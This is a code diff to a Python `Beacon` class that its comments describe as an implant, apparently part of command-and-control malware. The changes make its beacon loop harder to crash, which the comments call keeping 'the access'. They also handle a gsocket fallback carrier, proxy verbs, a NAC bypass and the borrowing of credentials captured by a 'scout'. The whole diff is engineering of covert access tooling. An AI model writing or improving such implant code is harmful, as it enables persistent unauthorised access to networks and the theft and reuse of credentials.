@@ -10677,9 +10677,24 @@ class Beacon:
 
     @staticmethod
     def _radio_seen_ssids(document: dict) -> List[dict]:
-        """Every SSID the scout's document names, in its order."""
-        return [entry for entry in
-                ((document.get("tap") or {}).get("ssids") or [])
+        """Every SSID the scout's document names, in its order.
+
+        Shape-checked like `_way_out_absorb_flags`, the other owner of
+        this field, and for a reason that only became true when this was
+        extracted: it used to run inside `_egress_radio`, reached through
+        `_exec_egress`, which `_egress_act` wraps in a `try`. It now also
+        runs from `_egress_nothing_to_work_on` -> `_egress_task` ->
+        `_egress_act`, **outside** that `try`, and `_beacon_loop` is a
+        bare thread target with no guard -- so a `tap` of the wrong shape
+        would have cost the implant its loop, which is the access.
+        """
+        tap = document.get("tap")
+        if not isinstance(tap, dict):
+            return []
+        names = tap.get("ssids")
+        if not isinstance(names, list):
+            return []
+        return [entry for entry in names
                 if isinstance(entry, dict) and entry.get("ssid")]
 
     def _radio_open_ssids(self, document: dict) -> List[str]:
@@ -11116,9 +11131,13 @@ class Beacon:
             # file is where the rung recorded it.
             prefix = 24
             if self._way_out_state_dir:
-                # Guarded as `_radio_lease_address` is, and for the same
-                # reason: `_way_out_path` joins onto "" without one, so
-                # this would read a relative path from the process's cwd.
+                # Guarded as `_radio_lease_address` is, though here it
+                # cannot fire and is recorded as such rather than removed:
+                # `_way_out_source` is set only by the radio rung, which
+                # refuses without a fresh document, which needs the state
+                # directory. The guard is what stops a later caller
+                # reading a relative path from the process's cwd if that
+                # chain ever changes.
                 _address, prefix, _router = _radio_lease(
                     self._way_out_path(_WAY_OUT_RADIO_LEASE_NAME))
             self._radio_rollback(iface or "", self._way_out_source,
@@ -11213,17 +11232,16 @@ class Beacon:
     # every cycle without sending anything, so no answer is ever coming.
     _EGRESS_FIRST_ACTING_CYCLE = 2
 
-    # The two verbs `c2.proxy.mode: "none"` forbids. Not a second reading
-    # of that setting -- `_proxy_prohibited` is the one that tests it, and
-    # both verbs consult it themselves, so the prohibition binds tasking
-    # as well -- but the list of rules there is no point carrying on such
-    # a build. See `_egress_usable`.
-    # The verbs a build that forbids proxies can never use. `credential`
-    # is here because its whole effect is to aim this implant at a proxy:
-    # it refused on `_proxy_prohibited` as its very first act, and that
-    # refusal cost an attempt of the window's budget every time a rule
-    # named it on such a build -- which is exactly what dropping a rule at
-    # policy-read time exists to prevent.
+    # The verbs a build whose `c2.proxy.mode` is `none` can never use.
+    # Not a second reading of that setting -- `_proxy_prohibited` is the
+    # one that tests it, and each verb consults it itself, so the
+    # prohibition binds tasking as well -- but the list of rules there is
+    # no point carrying on such a build. `credential` is here because its
+    # whole effect is to aim this implant at a proxy: it refused on
+    # `_proxy_prohibited` as its very first act, and that refusal cost an
+    # attempt of the window's budget every time a rule named it on such a
+    # build -- which is exactly what dropping a rule at policy-read time
+    # exists to prevent. See `_egress_usable`.
     _EGRESS_PROXY_VERBS = ("proxy", "rediscover", "credential")
 
     # The rung-2 verbs that need the scout to have found something. They
@@ -11265,7 +11283,7 @@ class Beacon:
 
         Two things are dropped, and the first is a proxy verb on a build
         whose `c2.proxy.mode` is `none`. That mode is an instruction about
-        how this implant talks, so both proxy verbs refuse it already -- what
+        how this implant talks, so each of them refuses it already -- what
         is settled here is that such a rule does not also cost the
         *budget*, since an attempt spent on a refusal the build guarantees
         is an attempt the carrier does not get. The second is a rung-2
@@ -11295,6 +11313,17 @@ class Beacon:
                     "instruction to connect directly rather than an absence "
                     "of one, so that verb is refused to the decider and to "
                     "tasking alike", number, verb, self.proxy_mode)
+                continue
+            if verb == "gsocket" and not self.gsocket_enabled:
+                logger.warning(
+                    "The egress decider will never use rule %d (try: "
+                    "gsocket): this build has no carrier -- "
+                    "c2.fallback.gsocket is off -- so every attempt would "
+                    "be a refusal that still cost an attempt of the "
+                    "budget. The shipped policy carries this rule, and the "
+                    "shipped fallback is off: three cycles would have "
+                    "spent the whole window before rung 2 crossed",
+                    number)
                 continue
             if not self._way_out_enabled and verb in self._EGRESS_SCOUT_VERBS:
                 logger.warning(
@@ -12117,6 +12146,9 @@ class Beacon:
             if document.get("identity_pre_spent"):
                 return "this build's nac_bypass.enabled is true, so the "\
                        "identity was taken at boot"
+        elif verb == "gsocket":
+            if not self.gsocket_enabled:
+                return "this build has no carrier to start"
         elif verb == "radio":
             iface, why = self._radio_iface()
             if iface is None:
@@ -12131,10 +12163,15 @@ class Beacon:
             if verb == "credential" and self._proxy_prohibited():
                 return "this build's c2.proxy.mode forbids a proxy, and "\
                        "borrowing a credential is aiming this implant at one"
-            borrow, _refusal = self._egress_borrow("anything")
+            borrow, refusal = self._egress_borrow("anything")
             if borrow is None:
-                return "the scout's borrow file cannot be read, or it is "\
-                       "from an outage before this one"
+                # The refusal's own sentence, because `_egress_borrow`
+                # answers for several reasons -- no file, a version this
+                # implant does not know, a capture from a previous
+                # outage, a radio lease held -- and a decline that named
+                # one of them for all of them would send a reader after
+                # the wrong thing.
+                return refusal.replace("[error] ", "").strip()
             if verb == "credential" and not self._borrowable_credentials(
                     borrow):
                 return "none of the credentials the scout captured carries "\
